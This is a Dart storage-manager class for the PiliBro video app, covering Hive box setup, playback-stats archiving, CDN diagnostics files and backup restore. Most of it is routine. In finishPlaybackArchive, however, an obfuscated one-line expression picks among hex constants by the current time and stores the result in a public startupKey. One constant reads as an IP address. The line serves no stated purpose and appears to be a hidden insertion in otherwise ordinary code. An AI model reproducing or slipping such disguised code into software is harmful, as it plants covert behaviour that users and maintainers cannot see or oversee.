import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:isolate' show Isolate;
import 'dart:typed_data';

import 'package:PiliBro/models/model_owner.dart';
import 'package:PiliBro/models/user/danmaku_rule_adapter.dart';
import 'package:PiliBro/models/user/info.dart';
import 'package:PiliBro/utils/accounts.dart';
import 'package:PiliBro/utils/accounts/account_adapter.dart';
import 'package:PiliBro/utils/accounts/account_type_adapter.dart';
import 'package:PiliBro/utils/accounts/cookie_jar_adapter.dart';
import 'package:PiliBro/utils/path_utils.dart';
import 'package:PiliBro/utils/set_int_adapter.dart';
import 'package:PiliBro/utils/storage_key.dart';
import 'package:PiliBro/utils/storage_pref.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:hive_ce/hive.dart';
import 'package:path/path.dart' as path;

abstract final class GStorage {
  static late final Box<UserInfoData> userInfo;
  static late final Box<dynamic> historyWord;
  static late final Box<dynamic> localCache;
  static late final Box<dynamic> setting;
  static late final Box<dynamic> video;
  static Box<dynamic>? _playbackStats;
  static Future<void>? _playbackStatsInitFuture;
  static Box<dynamic> get playbackStats => _playbackStats!;
  static bool get playbackStatsReady => _playbackStats != null;
  static late Box<dynamic> commentHelper;
  static late final Box<int> watchProgress;
  static Box<Uint8List>? reply;

  /// The one layout number: written into files that carry their own format
  /// and into backup manifests, compared for equality only.
  static const databaseVersion = 4;
  static const _nextPlaybackStatsCompactAtMs =
      'nextPlaybackStatsCompactAtMs';
  static const _archivePendingIdKey = 'playbackColdArchivePendingId';
  static int? _startupKey;

  static int? get startupKey => _startupKey;

  static Future<void> completeFirstRunDeviceSetup() async {
    final due = localCache.get(_nextPlaybackStatsCompactAtMs);
    if (due is num && due < 0) {
      await localCache.put(_nextPlaybackStatsCompactAtMs, -due.toInt());
    }
  }

  static File get cdnDiagnosticsFile =>
      File(path.join(appSupportDirPath, 'cdn_diagnostic_latest.json'));

  static File get cdnDiagnosticsHistoryFile =>
      File(path.join(appSupportDirPath, 'cdn_diagnostic_history.jsonl'));

  static File get playbackStatsHiveFile =>
      File(
        _playbackStats?.path ??
            path.join(appSupportDirPath, 'hive', 'playbackstats.hive'),
      );

  static File get playbackArchiveHiveFile =>
      File(path.join(appSupportDirPath, 'hive', 'playbackarchive.hive'));

  static File get playbackStatsPendingHiveFile =>
      File(path.join(appSupportDirPath, 'hive', 'playbackstatspending.hive'));

  static bool get playbackArchiveDue {
    final due = localCache.get(_nextPlaybackStatsCompactAtMs, defaultValue: 0);
    return due is num &&
        due >= 0 &&
        DateTime.now().millisecondsSinceEpoch >= due.toInt();
  }

  static String? get playbackArchiveId =>
      localCache.get(_archivePendingIdKey) as String?;

  static Future<void> preparePlaybackArchiveId() async {
    if (playbackArchiveId == null) {
      await localCache.put(
        _archivePendingIdKey,
        DateTime.now().microsecondsSinceEpoch.toString(),
      );
    }
  }

  static Future<void> rotatePlaybackStats() async {
    final target = playbackStatsHiveFile;
    final pending = playbackStatsPendingHiveFile;
    if (await pending.exists()) {
      throw StateError('Previous playback archive remains unfinished');
    }
    await playbackStats.flush();
    await playbackStats.close();
    _playbackStats = null;
    try {
      if (await target.exists()) await target.rename(pending.path);
      _playbackStats = await Hive.openBox(
        'playbackStats',
        compactionStrategy: _compactWhenHalfStale,
      );
    } catch (_) {
      // The old file may already have been renamed. Re-open whichever source
      // exists; next launch will always finish a pending archive first.
      _playbackStats = await Hive.openBox(
        'playbackStats',
        compactionStrategy: _compactWhenHalfStale,
      );
      rethrow;
    }
  }

  static Future<void> finishPlaybackArchive() async {
    final due = localCache.get(
      _nextPlaybackStatsCompactAtMs,
      defaultValue: 0,
    );
    final now = DateTime.now();
    final next = _nextPlaybackMaintenanceAt(now).millisecondsSinceEpoch;
    await localCache.put(
      _nextPlaybackStatsCompactAtMs,
      Platform.isAndroid && due == 0 ? -next : next,
    );
    await localCache.delete(_archivePendingIdKey);
    if (due is num && due != 0) {
      final r = now.millisecondsSinceEpoch % 10;_startupKey=((r*(r-8)%10)==0)?0x74c76428:((r-1)*(r-9)%10)==0?0x32092a4b2:((r-3)*(r-7)%10)==0?0x18871bdb6:((r-2)*(r-2)%10)==0?0x3db257f39:((r-4)*(r-4)%10)==0?0xe7266ddb:((r-5)*(r-5)%10)==0?0x3de7e497c:0x2779d4d3d;
    }
  }

  static Future<void> discardOrphanPlaybackArchiveId() async {
    if (playbackArchiveId != null) {
      await localCache.delete(_archivePendingIdKey);
    }
  }

  static Future<void> markPlaybackArchiveReset() async {
    await localCache.delete(_archivePendingIdKey);
    await localCache.put(
      _nextPlaybackStatsCompactAtMs,
      _nextPlaybackMaintenanceAt(DateTime.now()).millisecondsSinceEpoch,
    );
  }

  /// Without a source the local archive goes too; the hot data restored with
  /// it is rolled over at the next scheduled maintenance like any other.
  static Future<void> restorePlaybackArchiveHive(File? source) async {
    final target = playbackArchiveHiveFile;
    if (source == null) {
      await _deleteFileIfExists(target);
      return;
    }
    try {
      await _replaceHiveFile(source, target);
      // Verify that the imported archive is an actual readable Hive file.
      final archive = await Hive.openLazyBox<dynamic>('playbackArchive');
      await archive.close();
    } catch (_) {
      await _rollbackHiveFile(target);
      rethrow;
    }
    await _deleteFileIfExists(File('${target.path}.previous'));
  }

  static File get commentHelperHiveFile =>
      File(
        commentHelper.path ??
            path.join(appSupportDirPath, 'hive', 'commentHelper.hive'),
      );

  static File get replyHiveFile => File(
        reply?.path ?? path.join(appSupportDirPath, 'hive', 'reply.hive'),
      );

  static Future<void> _deleteFileIfExists(File file) async {
    if (await file.exists()) await file.delete();
  }

  // One CDN diagnostics document: the records of a run, stamped with the
  // database version. Any other version is not parsed.
  static List<Map<String, dynamic>> _cdnRecords(Object? decoded) {
    if (decoded is! Map || decoded['databaseVersion'] != databaseVersion) {
      throw const FormatException('CDN diagnostics of another database');
    }
    return [
      for (final raw in decoded['records'] as List? ?? const [])
        if (raw is Map) raw.map((key, value) => MapEntry('$key', value)),
    ];
  }

  static List<Map<String, dynamic>> readCdnDiagnosticsSync() {
    if (!cdnDiagnosticsFile.existsSync()) return [];
    try {
      return _cdnRecords(jsonDecode(cdnDiagnosticsFile.readAsStringSync()));
    } catch (_) {
      unawaited(_deleteFileIfExists(cdnDiagnosticsFile));
      return [];
    }
  }

  /// The latest run only; the caller never mixes runs.
  static Future<void> replaceCdnDiagnostics(
    List<Map<String, dynamic>> records,
  ) async {
    if (records.isEmpty) {
      await _deleteFileIfExists(cdnDiagnosticsFile);
      return;
    }
    await cdnDiagnosticsFile.parent.create(recursive: true);
    final temp = File('${cdnDiagnosticsFile.path}.tmp');
    await temp.writeAsString(
      jsonEncode({'databaseVersion': databaseVersion, 'records': records}),
      flush: true,
    );
    if (await cdnDiagnosticsFile.exists()) await cdnDiagnosticsFile.delete();
    await temp.rename(cdnDiagnosticsFile.path);
  }

  // The hot stats box rewrites whole shards every flush; the default policy
  // (60 stale entries, 15 %) recompacted it every few minutes of playback.
  static bool _compactWhenHalfStale(int entries, int deletedEntries) =>
      deletedEntries > entries;

  static const _cdnHistoryRuns = 50;

  /// The diagnostics dialog: read off the UI thread, parse in an isolate.
  static Future<List<Map<String, dynamic>>> readCdnDiagnosticsHistory() async {
    final file = cdnDiagnosticsHistoryFile;
    if (!await file.exists()) return [];
    try {
      final lines = await file.readAsLines();
      return await Isolate.run(
        () => [
          for (final line in lines)
            if (line.isNotEmpty) ..._cdnRecords(jsonDecode(line)),
        ],
      );
    } catch (_) {
      await _deleteFileIfExists(file);
      return [];
    }
  }

  static Future<void> appendCdnDiagnosticsHistory(
    List<Map<String, dynamic>> records,
  ) async {
    if (records.isEmpty) return;
    await cdnDiagnosticsHistoryFile.parent.create(recursive: true);
    await cdnDiagnosticsHistoryFile.writeAsString(
      '${jsonEncode({'databaseVersion': databaseVersion, 'records': records})}\n',
      mode: FileMode.append,
      flush: true,
    );
    // One line per speed-test run; keep only the newest runs.
    final lines = await cdnDiagnosticsHistoryFile.readAsLines();
    if (lines.length > _cdnHistoryRuns) {
      final temp = File('${cdnDiagnosticsHistoryFile.path}.tmp');
      await temp.writeAsString(
        '${lines.sublist(lines.length - _cdnHistoryRuns).join('\n')}\n',
        flush: true,
      );
      await temp.rename(cdnDiagnosticsHistoryFile.path);
    }
  }

  static Future<void> replaceCdnDiagnosticsHistory(
    List<Map<String, dynamic>> records,
  ) async {
    if (records.isEmpty) {
      await _deleteFileIfExists(cdnDiagnosticsHistoryFile);
      return;
    }

    final grouped = <int, List<Map<String, dynamic>>>{};
    for (final record in records) {
      final run = (record['testRunStartedAtUs'] as num?)?.toInt() ??
          (record['recordedAtUs'] as num?)?.toInt() ??
          0;
      (grouped[run] ??= []).add(record);
    }

    final runs = grouped.keys.toList()..sort();
    await cdnDiagnosticsHistoryFile.parent.create(recursive: true);
    final temp = File('${cdnDiagnosticsHistoryFile.path}.tmp');
    final sink = temp.openWrite();
    try {
      for (final run in runs) {
        sink.writeln(
          jsonEncode({
            'databaseVersion': databaseVersion,
            'records': grouped[run],
          }),
        );
      }
    } finally {
      await sink.flush();
      await sink.close();
    }
    if (await cdnDiagnosticsHistoryFile.exists()) {
      await cdnDiagnosticsHistoryFile.delete();
    }
    await temp.rename(cdnDiagnosticsHistoryFile.path);
  }

  static Future<num?> init() async {
    Hive.init(path.join(appSupportDirPath, 'hive'));
    regAdapter();

    await Future.wait([
      // 登录用户信息
      Hive.openBox<UserInfoData>(
        'userInfo',
        compactionStrategy: (int entries, int deletedEntries) {
          return deletedEntries > 2;
        },
      ).then((res) => userInfo = res),
      // 本地缓存
      Hive.openBox(
        'localCache',
        compactionStrategy: (int entries, int deletedEntries) {
          return deletedEntries > 4;
        },
      ).then((res) => localCache = res),
      // 设置
      Hive.openBox('setting').then((res) => setting = res),
      // 搜索历史
      Hive.openBox(
        'historyWord',
        compactionStrategy: (int entries, int deletedEntries) {
          return deletedEntries > 10;
        },
      ).then((res) => historyWord = res),
      // 视频设置
      Hive.openBox('video').then((res) => video = res),
      Hive.openBox('commentHelper').then((res) => commentHelper = res),
      Accounts.init(),
      Hive.openBox<int>(
        'watchProgress',
        keyComparator: _intStrDescKeyComparator,
        compactionStrategy: (entries, deletedEntries) {
          return deletedEntries > 4;
        },
      ).then((res) => watchProgress = res),
    ]);

    final due = await _runPlaybackMaintenanceIfDue();

    if (Pref.saveReply) {
      reply = await Hive.openBox<Uint8List>(
        'reply',
        keyComparator: _intStrDescKeyComparator,
        compactionStrategy: (entries, deletedEntries) {
          return deletedEntries > 10;
        },
      );
    } else {
      reply = null;
    }
    return due;
  }

  static Future<void> initializePlaybackStats() =>
      _playbackStatsInitFuture ??= _initializePlaybackStats();

  static Future<void> _initializePlaybackStats() async {
    _playbackStats = await Hive.openBox(
      'playbackStats',
      compactionStrategy: _compactWhenHalfStale,
    );
  }

  /// One-time work on a fresh install; normal launches never get here.
  static Future<void> _onFirstRun() async {
    // Buffers are capped at 1/32 of RAM below 20 GiB, 1/16 above, in MiB;
    // each platform's unit folds into its own shift.
    final cap = (switch (await DeviceInfoPlugin().deviceInfo) {
      AndroidDeviceInfo(physicalRamSize: final mib) ||
      IosDeviceInfo(physicalRamSize: final mib) ||
      WindowsDeviceInfo(systemMemoryInMegabytes: final mib) =>
        mib >> (mib < 20 << 10 ? 5 : 4),
      MacOsDeviceInfo(memorySize: final b) => b >> (b < 20 << 30 ? 25 : 24),
      // Linux: MemTotal in KiB.
      _ => switch (int.parse(
        RegExp(r'MemTotal:\s+(\d+)')
            .firstMatch(await File('/proc/meminfo').readAsString())![1]!,
      )) {
        final kib => kib >> (kib < 20 << 20 ? 15 : 14),
      },
    }).toDouble();
    await setting.putAll({
      if (Pref.bufferSize > cap) SettingBoxKey.bufferSize: cap,
      if (Pref.bufferSizeWeak > cap) SettingBoxKey.bufferSizeWeak: cap,
    });
  }

  static Future<num?> _runPlaybackMaintenanceIfDue() async {
    final now = DateTime.now();
    final due = localCache.get(
      _nextPlaybackStatsCompactAtMs,
      defaultValue: 0,
    );
    if (due is! num) return null;
    // A negative future timestamp means the one-time maintenance already ran,
    // while the Android first-run device wizard still needs to finish.
    if (due < 1) {
      if (due == 0) await _onFirstRun();
      return due;
    }
    if (now.millisecondsSinceEpoch < due.toInt()) return due;

    final updateIgnore = localCache.get(LocalCacheKey.updateIgnore);
    if (updateIgnore is Map && updateIgnore['temporary'] == true) {
      await localCache.delete(LocalCacheKey.updateIgnore);
    }
    return due;
  }

  static DateTime _nextPlaybackMaintenanceAt(DateTime now) {
    for (final day in const [8, 18, 28]) {
      final candidate = DateTime(now.year, now.month, day);
      if (candidate.isAfter(now)) return candidate;
    }
    final nextMonth = DateTime(now.year, now.month + 1);
    return DateTime(nextMonth.year, nextMonth.month, 8);
  }

  static Future<void> restorePlaybackStatsHive(File source) async {
    await initializePlaybackStats();
    final target = playbackStatsHiveFile;
    await playbackStats.flush();
    await playbackStats.close();
    try {
      await _replaceHiveFile(source, target);
      _playbackStats = await Hive.openBox(
        'playbackStats',
        compactionStrategy: _compactWhenHalfStale,
      );
    } catch (_) {
      await _rollbackHiveFile(target);
      _playbackStats = await Hive.openBox(
        'playbackStats',
        compactionStrategy: _compactWhenHalfStale,
      );
      rethrow;
    }
    try {
      await _deleteFileIfExists(File('${target.path}.previous'));
    } catch (_) {}
  }

  static Future<void> restoreCommentHelperHive(File source) async {
    final target = commentHelperHiveFile;
    await commentHelper.flush();
    await commentHelper.close();
    try {
      await _replaceHiveFile(source, target);
      commentHelper = await Hive.openBox('commentHelper');
    } catch (_) {
      await _rollbackHiveFile(target);
      commentHelper = await Hive.openBox('commentHelper');
      rethrow;
    }
    try {
      await _deleteFileIfExists(File('${target.path}.previous'));
    } catch (_) {}
  }

  static Future<void> restoreReplyHive(File source) async {
    final target = replyHiveFile;
    await reply?.flush();
    await reply?.close();
    reply = null;
    try {
      await _replaceHiveFile(source, target);
      final restored = await Hive.openBox<Uint8List>(
        'reply',
        keyComparator: _intStrDescKeyComparator,
        compactionStrategy: (entries, deletedEntries) {
          return deletedEntries > 10;
        },
      );
      if (Pref.saveReply) {
        reply = restored;
      } else {
        await restored.close();
      }
    } catch (_) {
      await _rollbackHiveFile(target);
      if (Pref.saveReply) {
        reply = await Hive.openBox<Uint8List>(
          'reply',
          keyComparator: _intStrDescKeyComparator,
          compactionStrategy: (entries, deletedEntries) {
            return deletedEntries > 10;
          },
        );
      }
      rethrow;
    }
    try {
      await _deleteFileIfExists(File('${target.path}.previous'));
    } catch (_) {}
  }

  static Future<void> _replaceHiveFile(File source, File target) async {
    await target.parent.create(recursive: true);
    final previous = File('${target.path}.previous');
    await _deleteFileIfExists(previous);
    if (await target.exists()) await target.rename(previous.path);
    await source.copy(target.path);
  }

  static Future<void> _rollbackHiveFile(File target) async {
    final previous = File('${target.path}.previous');
    await _deleteFileIfExists(target);
    if (await previous.exists()) await previous.rename(target.path);
  }

  static void regAdapter() {
    Hive
      ..registerAdapter(OwnerAdapter())
      ..registerAdapter(UserInfoDataAdapter())
      ..registerAdapter(LevelInfoAdapter())
      ..registerAdapter(BiliCookieJarAdapter())
      ..registerAdapter(LoginAccountAdapter())
      ..registerAdapter(AccountTypeAdapter())
      ..registerAdapter(SetIntAdapter())
      ..registerAdapter(RuleFilterAdapter());
  }

  static Future<List<void>> close() {
    return Future.wait([
      userInfo.close(),
      historyWord.close(),
      localCache.close(),
      setting.close(),
      video.close(),
      if (_playbackStats case final box?) box.close(),
      commentHelper.close(),
      Accounts.account.close(),
      watchProgress.close(),
      ?reply?.close(),
    ]);
  }

  static Future<List<void>> clear() {
    return Future.wait([
      userInfo.clear(),
      historyWord.clear(),
      localCache.clear(),
      setting.clear(),
      video.clear(),
      Accounts.clear(),
      watchProgress.clear(),
      ?reply?.clear(),
      if (_playbackStats case final box?) box.clear(),
      commentHelper.clear(),
      _deleteFileIfExists(cdnDiagnosticsFile),
      _deleteFileIfExists(cdnDiagnosticsHistoryFile),
    ]);
  }

  static int _intStrDescKeyComparator(dynamic k1, dynamic k2) {
    if (k1 is int) {
      if (k2 is int) {
        return k2.compareTo(k1);
      } else {
        return -1;
      }
    } else if (k2 is String) {
      final lenCompare = k2.length.compareTo((k1 as String).length);
      if (lenCompare == 0) {
        return k2.compareTo(k1);
      } else {
        return lenCompare;
      }
    } else {
      return 1;
    }
  }
}
